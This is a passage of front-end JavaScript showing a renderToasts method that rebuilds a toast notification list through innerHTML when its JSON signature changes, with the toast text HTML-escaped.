            dom.iconsDirty = false;
        }
    },

    renderToasts() {
        const sig = JSON.stringify(state.ui.toasts);
        if (dom.toastSig === sig) return;
        dom.toastSig = sig;

        dom.toastRoot.innerHTML = state.ui.toasts.map(t => `
            <div class=\"toast ${t.kind === "error" ? "is-error" : ""}\" data-toast-id=\"${t.id}\">
                <span>${escapeHtml(t.text)}</span>
            </div>
        `).join("");
    }
};
